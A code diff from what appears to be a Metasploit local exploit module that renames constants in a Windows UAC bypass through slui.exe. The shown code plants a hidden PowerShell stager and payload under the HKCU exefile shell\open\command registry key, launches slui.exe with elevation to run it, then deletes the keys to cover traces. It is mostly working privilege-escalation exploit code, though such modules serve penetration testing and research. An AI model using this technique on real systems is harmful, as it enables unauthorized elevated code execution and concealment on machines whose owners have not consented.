@@ -14,12 +14,12 @@ class MetasploitModule < Msf::Exploit::Local
   include Post::Windows::Registry
   include Post::Windows::Runas
 
-  FODHELPER_DEL_KEY     = "HKCU\\Software\\Classes\\exefile".freeze
-  FODHELPER_WRITE_KEY   = "HKCU\\Software\\Classes\\exefile\\shell\\open\\command".freeze
+  SLUI_DEL_KEY          = "HKCU\\Software\\Classes\\exefile".freeze
+  SLUI_WRITE_KEY        = "HKCU\\Software\\Classes\\exefile\\shell\\open\\command".freeze
   EXEC_REG_DELEGATE_VAL = 'DelegateExecute'.freeze
   EXEC_REG_VAL          = ''.freeze # This maps to "(Default)"
   EXEC_REG_VAL_TYPE     = 'REG_SZ'.freeze
-  FODHELPER_PATH        = "%WINDIR%\\System32\\slui.exe".freeze
+  SLUI_PATH             = "%WINDIR%\\System32\\slui.exe".freeze
   CMD_MAX_LEN           = 16383
 
   def initialize(info = {})
@@ -128,27 +128,27 @@ class MetasploitModule < Msf::Exploit::Local
       fail_with(Failure::None, "Payload size should be smaller then #{CMD_MAX_LEN} (actual size: #{psh_payload.length})")
     end
 
-    psh_stager = "\"IEX (Get-ItemProperty -Path #{FODHELPER_WRITE_KEY.gsub('HKCU', 'HKCU:')} -Name #{payload_value}).#{payload_value}\""
+    psh_stager = "\"IEX (Get-ItemProperty -Path #{SLUI_WRITE_KEY.gsub('HKCU', 'HKCU:')} -Name #{payload_value}).#{payload_value}\""
     cmd = "#{psh_path} -nop -w hidden -c #{psh_stager}"
 
-    existing = registry_getvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, registry_view) || ""
-    exist_delegate = !registry_getvaldata(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view).nil?
+    existing = registry_getvaldata(SLUI_WRITE_KEY, EXEC_REG_VAL, registry_view) || ""
+    exist_delegate = !registry_getvaldata(SLUI_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view).nil?
 
     if existing.empty?
-      registry_createkey(FODHELPER_WRITE_KEY, registry_view)
+      registry_createkey(SLUI_WRITE_KEY, registry_view)
     end
 
     print_status("Configuring payload and stager registry keys ...")
     unless exist_delegate
-      registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, '', EXEC_REG_VAL_TYPE, registry_view)
+      registry_setvaldata(SLUI_WRITE_KEY, EXEC_REG_DELEGATE_VAL, '', EXEC_REG_VAL_TYPE, registry_view)
     end
 
-    registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)
-    registry_setvaldata(FODHELPER_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)
+    registry_setvaldata(SLUI_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)
+    registry_setvaldata(SLUI_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)
 
     # Calling slui.exe through cmd.exe allow us to launch it from either x86 or x64 session arch.
     cmd_path = expand_path(commspec)
-    cmd_args = expand_path("Start-Process #{FODHELPER_PATH} -Verb runas")
+    cmd_args = expand_path("Start-Process #{SLUI_PATH} -Verb runas")
     print_status("Executing payload: #{cmd_path} #{cmd_args}")
 
     # We can't use cmd_exec here because it blocks, waiting for a result.
@@ -162,14 +162,14 @@ class MetasploitModule < Msf::Exploit::Local
 
     print_status("Cleaining up registry keys ...")
     unless exist_delegate
-      registry_deleteval(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view)
+      registry_deleteval(SLUI_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view)
     end
     if existing.empty?
-      registry_deletekey(FODHELPER_DEL_KEY, registry_view)
+      registry_deletekey(SLUI_DEL_KEY, registry_view)
     else
-      registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)
+      registry_setvaldata(SLUI_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)
     end
-    registry_deleteval(FODHELPER_WRITE_KEY, payload_value, registry_view)
+    registry_deleteval(SLUI_WRITE_KEY, payload_value, registry_view)
   end
 
   def check_permissions!
